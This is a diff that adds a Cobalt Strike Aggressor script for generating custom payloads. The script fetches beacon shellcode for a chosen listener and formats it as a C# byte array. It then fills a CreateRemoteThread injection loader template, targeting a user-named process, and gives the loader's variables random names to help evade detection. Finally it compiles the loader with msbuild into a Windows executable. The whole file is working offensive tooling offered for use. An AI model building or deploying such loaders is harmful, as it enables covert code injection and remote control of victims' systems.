@@ -1,0 +1,119 @@
+#
+# C# CreateThread VirtualAlloc Injection
+#
+# Reference: https://github.com/offsecginger/AggressorScripts
+# This payload sample only works with x86 it is possible to edit this, add more methods and have 64 bit work as well
+#
+# You have to builds payload first manually in Visual Studio, create the SLN project files and then add them here
+#
+
+global('$TEMPDIR');
+$TEMPDIR = cwd() . "/payloads/";
+mkdir(cwd(). "/payloads/");
+
+# Most Ghetto OS Detection award goes to...
+if (substr(cwd(), 0, 1) eq "/") {
+	$os = "linux";
+	}
+else {
+	$os = "windows";
+	$TEMPDIR = strrep($TEMPDIR, "/", "\\")
+	}
+
+# Generate Payloads submenu
+sub gen_payload {
+	$dialog = dialog("Custom payload Generator - CreateRemoteThread", %(listener => "Select Listener: ", payload_type => "Delivery: ", template => "Template: ", target_net => "v4.8", assembly_name => "payload_createthread"), &templates);
+	dialog_description($dialog, "Creates an exe that runs shellcode using CreateRemoteThread");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "payload_type", "Delivery: ", @("Stageless"));
+	# Add additional templates if you want to below
+	drow_combobox($dialog, "template", "Template: ", @("C# CreateRemoteThread"));
+	drow_combobox($dialog, "platform", "Platform: ", @("x64"));
+	drow_combobox($dialog, "file_type", "File Type: ", @("winexe"));
+	drow_text($dialog, "target_net", ".NET Target: ");
+	drow_text($dialog, "target_proc", "Targeted Process: ");
+	drow_text($dialog, "assembly_name", "Assembly Name: ");
+	#Not compatible with x86
+	#drow_checkbox($dialog, "x86", "x86: ", "Use x86 Payload");
+	dbutton_action($dialog, "Generate");
+	dialog_show($dialog);
+}
+
+sub templates {
+	$target_dotnet = $3['target_net'];
+	$ftype = $3['file_type'];
+	$platform = $3['platform'];
+	$tproc = $3['target_proc'];
+	$fname = $3['assembly_name']; 
+
+	# Listener needs to be selected
+	if ($3['listener'] ismatch "Select Listener: ") {
+		berror($1, 'You did not select a Listener.');
+		show_message("Please select a Listener.");
+	}
+	
+	else if ($3['template'] eq 'C# CreateRemoteThread') {
+		$arch = "x64";
+		if ($3['x86'] eq "true") {
+			$arch = "x86";
+		}
+		if ($3['payload_type'] eq "Staged" || $3['payload_type'] eq "Stageless") {
+			if ($3['payload_type'] eq "Staged") {
+				berror($1, 'Only Stageless Payloads supported');
+				show_message("Stageless Payload only");
+				break;
+			}
+				if ($os eq "windows") {
+					$compiler = "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\msbuild.exe\"";
+				}
+				else if ($os eq "linux") {
+					# Test linux for later, maybe use mingw??
+					#$compiler = "msbuild";
+					#$compiler = "mcs";
+				}
+				# Setup shellcode
+				$shellcode = payload($3['listener'], $arch, "process");
+				# Payload length
+				$sc_size = strlen($shellcode);
+				$payload_string = format_csharp($shellcode);
+				$handle = openf(script_resource("./templates/CreateRemoteThread/CreateRemoteThread_Loader.cs"));
+				$data   = readb($handle, -1);
+				#Add random strings to variables, avoid this later because of ENTROPY
+				for ($r = 0; $r < 50; $r++) {
+					$rstring = random_string(rand(range("5-10")));
+					$data = strrep($data, "%%VAR".$r."%%", $rstring);
+				}
+				$fdata = strrep($data, "%%DATA%%", $payload_string, "%%LENGTH%%", $sc_size, "%%PROCESS%%", $tproc);
+				closef($handle);
+				$tempcs = openf(">C:\\Tools\\cobaltstrike\\aggressors\\PG\\templates\\CreateRemoteThread\\CreateRemoteThread\\CreateRemoteThread_Loader.cs");
+				println(">C:\\Tools\\cobaltstrike\\aggressors\\PG\\templates\\CreateRemoteThread\\CreateRemoteThread\\CreateRemoteThread_Loader.cs");
+				writeb($tempcs, $fdata);
+				closef($tempcs);
+				$name = prompt_directory_open("Output Directory", $TEMPDIR, false, {
+					exec($compiler . " C:\\Tools\\cobaltstrike\\aggressors\\PG\\templates\\CreateRemoteThread\\CreateRemoteThread_Loader.sln /t:build /p:debugtype=none /p:targetframeworkversion=". $target_dotnet ." /p:outputtype=". $ftype ." /p:outputpath=" . $1 ." /p:configuration=release /p:platform=\"". $platform ."\" /p:AssemblyName=\"". $fname ."\" /nr:false" );
+					println($compiler . " C:\\Tools\\cobaltstrike\\aggressors\\PG\\templates\\CreateRemoteThread\\CreateRemoteThread_Loader.sln /t:build /p:debugtype=none /p:targetframeworkversion=". $target_dotnet ." /p:outputtype=". $ftype ." /p:outputpath=" . $1 ." /p:configuration=release /p:platform=\"". $platform ."\" /p:AssemblyName=\"". $fname ."\" /nr:false" );
+				});
+		}
+	}
+}
+
+# Random String fucntion for variables
+sub random_string {
+	$limit = $1;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	for ($x = 0; $x < $limit; $x++) {
+		$n = rand(strlen($characters));
+		add(@random_str, charAt($characters, $n));
+	}
+	return join('', @random_str);
+}
+
+# Format shellcode into C# type 0x90,0x90,0x90
+sub format_csharp {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "hex"), 2);
+	return "0x". join(",0x", @fmt);
+}
+
+gen_payload();
